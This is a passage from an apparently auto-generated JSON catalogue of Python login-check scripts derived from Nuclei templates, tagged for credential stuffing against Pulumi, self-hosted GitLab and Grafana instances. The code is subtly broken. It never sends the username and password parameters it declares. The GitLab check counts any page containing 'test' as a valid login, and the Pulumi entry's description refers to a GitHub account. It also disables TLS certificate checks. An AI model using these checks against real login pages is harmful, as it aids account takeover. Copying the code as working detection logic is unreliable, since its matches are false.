{}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'pulumiAccessToken, userInfo' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['pulumiAccessToken, userInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"pulmi.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_pulmi_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: pulmi-login-check\nName: pulmi.com Login Check\nSeverity: critical\nDescription: Checks for a valid github account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_pulmi_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"pulmi-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"pulmi.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'pulumiAccessToken, userInfo' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['pulumiAccessToken, userInfo']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"pulmi.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_pulmi_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "pulmi",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_gitlab_login_check_self_hosted",
        "name": "Gitlab Login Check Self Hosted",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid login on self hosted GitLab instance.",
        "severity": "critical",
        "detection": "[OR] DSL: status_code_2 == 302; !contains(to_lower(body_2), \"invalid login\")",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{username}}"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{password}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitlab-login-check-self-hosted\nName: Gitlab Login Check Self Hosted\nSeverity: critical\nDescription: Checks for a valid login on self hosted GitLab instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitlab_login_check_self_hosted:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitlab-login-check-self-hosted\"\n    SEVERITY = \"critical\"\n    NAME = \"Gitlab Login Check Self Hosted\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 302; !contains(to_lower(body_2), \"invalid login\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Gitlab Login Check Self Hosted\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitlab_login_check_self_hosted(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: gitlab-login-check-self-hosted\nName: Gitlab Login Check Self Hosted\nSeverity: critical\nDescription: Checks for a valid login on self hosted GitLab instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_gitlab_login_check_self_hosted:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"gitlab-login-check-self-hosted\"\n    SEVERITY = \"critical\"\n    NAME = \"Gitlab Login Check Self Hosted\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[OR] DSL: status_code_2 == 302; !contains(to_lower(body_2), \"invalid login\")'\n\n        # Simple word matcher simulation\n        matchers = ['test']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Gitlab Login Check Self Hosted\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_gitlab_login_check_self_hosted(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "creds-stuffing",
          "login-check",
          "self-hosted",
          "gitlab",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_grafana_login_check",
        "name": "Grafana Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid login on self hosted Grafana instance.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Logged in' | mot(s) 'grafana_session' | status HTTP [200]",
        "parameters": [
          {
            "name": "target",
            "datatype": "string",
            "required": true,
            "description": "Hostname ou IP de la cible"
          },
          {
            "name": "base_url",
            "datatype": "string",
            "required": true,
            "description": "URL de base de la cible"
          },
          {
            "name": "username",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: username",
            "default": "{{username}}"
          },
          {
            "name": "password",
            "datatype": "string",
            "required": false,
            "description": "Variable Nuclei custom: password",
            "default": "{{password}}"
          }
        ],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: grafana-login-check\nName: Grafana Login Check\nSeverity: critical\nDescription: Checks for a valid login on self hosted Grafana instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_grafana_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"grafana-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Grafana Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Logged in' | mot(s) 'grafana_session' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Logged in', 'grafana_session']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Grafana Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_grafana_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: grafana-login-check\nName: Grafana Login Check\nSeverity: critical\nDescription: Checks for a valid login on self hosted Grafana instance.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_grafana_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"grafana-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Grafana Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Logged in' | mot(s) 'grafana_session' | status HTTP [200]\"\n\n        # Simple word matcher simulation\n        matchers = ['Logged in', 'grafana_session']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Grafana Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_grafana_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 